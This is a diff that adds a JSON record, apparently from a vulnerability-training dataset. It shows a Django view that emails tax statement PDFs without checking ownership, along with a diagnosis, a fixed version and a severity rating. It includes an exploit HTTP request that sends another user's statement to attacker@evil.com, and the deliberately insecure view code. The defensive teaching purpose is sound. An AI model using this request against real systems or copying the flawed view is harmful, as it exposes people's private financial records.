@@ -1,0 +1,8 @@
+{
+  "vulnerable_code": "@require_POST\ndef email_tax_statement(request):\n    statement_id = request.POST.get('statement_id')\n    target_email = request.POST.get('target_email')\n    send_tax_statement_pdf_task.delay(statement_id=statement_id, recipient=target_email)\n    return JsonResponse({'message': 'Tax statement queued for delivery'})",
+  "diagnosis": "The view forwards statement_id directly to a Celery background worker without validating that the authenticated user owns the tax statement. The worker generates a PDF containing private financial and tax information and emails it to the attacker's specified address.",
+  "exploit_request": "POST /api/billing/statements/email/ HTTP/1.1\nHost: portal.example.com\nCookie: sessionid=attacker_session\nContent-Type: application/x-www-form-urlencoded\n\nstatement_id=9821&target_email=attacker@evil.com",
+  "corrected_code": "@require_POST\ndef email_tax_statement(request):\n    statement_id = request.POST.get('statement_id')\n    get_object_or_404(TaxStatement, id=statement_id, user=request.user)\n    target_email = request.user.email\n    send_tax_statement_pdf_task.delay(statement_id=statement_id, recipient=target_email)\n    return JsonResponse({'message': 'Tax statement queued for delivery'})",
+  "severity": "CRITICAL",
+  "confidence": 0.98
+}
